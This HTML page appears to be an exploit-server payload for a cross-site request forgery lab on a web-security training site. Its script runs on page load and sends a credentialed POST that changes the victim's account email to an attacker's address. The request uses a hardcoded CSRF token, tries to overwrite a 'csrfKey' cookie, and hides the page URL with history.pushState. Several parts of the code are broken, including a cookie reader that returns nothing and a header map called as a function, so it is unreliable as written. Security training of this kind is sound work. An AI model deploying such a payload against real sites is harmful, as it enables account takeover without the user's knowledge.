<html>
<head>
<script type="text/javascript" src="utils.js"></script>

</head>
<body>
  <h1>Here be dragons..</h1>
  <a href='https://github.com/SirAppSec/exploit-server'>https://github.com/SirAppSec/exploit-server</a>


  <script>history.pushState('', '', '/')</script>
    <script>
function setSpecificCookie(stringx,cname,cvalue) {
  return stringx.replace(cname+'=([a-zA-Z0-9\%])+(;)?',cname+'='+cvalue+';');
}
      async function getCookie(url){
        console.log('starting to get Cookie',url)
          var xhr = new XMLHttpRequest();
          xhr.open("GET",url,true);
          console.log(xhr.response)
xhr.onreadystatechange = function() {
  console.log("xhr ready",xhr.readyState,this.readyState)
  if(xhr.readyState == xhr.HEADERS_RECEIVED) {
console.log('header recieved')
    // Get the raw header string
    var headers = xhr.getAllResponseHeaders();
    console.log('headers:',headers)
    // Convert the header string into an array
    // of individual headers
    var arr = headers.trim().split(/[\r\n]+/);

    // Create a map of header names to values
    var headerMap = {};
    arr.forEach(function (line) {
      var parts = line.split(': ');
      var header = parts.shift();
      var value = parts.join(': ');
      headerMap[header] = value;
    });
    cookie = headerMap("Cookie")
    console.log(headerMap);
return cookie;
  }
}
          
      }
      function submitRequest(url)
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST",url, true);
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        newCookie = getCookie(url);
        alteredCookie = setSpecificCookie(newCookie,'csrfKey', 'wE6LxK7CO1FfF7XDW7q8NFR0R0pDMXUN')
        xhr.setRequestHeader('Cookie', alteredCookie);
        xhr.withCredentials = true;
        var body = "email=AWESOME%40gmail.com&csrf=MwS9ALAqWAX5jPkHVchRJmwPxziaiUXC";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }

url = "https:\/\/ac671fce1eedab46c0b042eb00590029.web-security-academy.net\/my-account"
      submitRequest(url);
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest(url);" />
    </form>

</body>
</html>